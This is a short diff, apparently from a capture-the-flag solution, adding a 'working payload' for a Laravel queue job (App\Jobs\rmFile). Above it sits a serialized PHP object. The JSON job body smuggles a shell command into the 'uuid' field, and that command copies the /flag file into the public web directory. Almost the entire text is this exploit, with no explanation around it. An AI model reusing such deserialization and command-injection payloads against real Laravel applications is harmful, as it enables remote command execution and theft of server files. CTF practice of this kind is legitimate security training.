@@ -6,3 +6,25 @@ O:15:"App\Jobs\rmFile":1:{
     s:8:"filePath";s:1:"x";
   }
 }
+
+---------------------------------------------------------------
+# Working payload in JSON format
+
+
+{
+    "uuid": "12345678-1234-1234-1234-123456789012", 
+    "displayName": "App\\Jobs\\rmFile",
+    "job": "Illuminate\\Queue\\CallQueuedHandler@call", 
+    "data": {
+        "commandName": "App\\Jobs\\rmFile",
+        "command": {
+            "fileQueue": {
+                "filePath": "/src/955c2c12-5d28-4e77-bdf8-5519336d9758.txt",
+                "uuid": "xyzf;cat /flag > /www/public/src/flag777", 
+                "ext": "txt"
+            }
+        }
+    },
+    "id": "n3b5scQzXL40UoEC6iX0s03a4x52kWcv",
+    "attempts": 0
+}
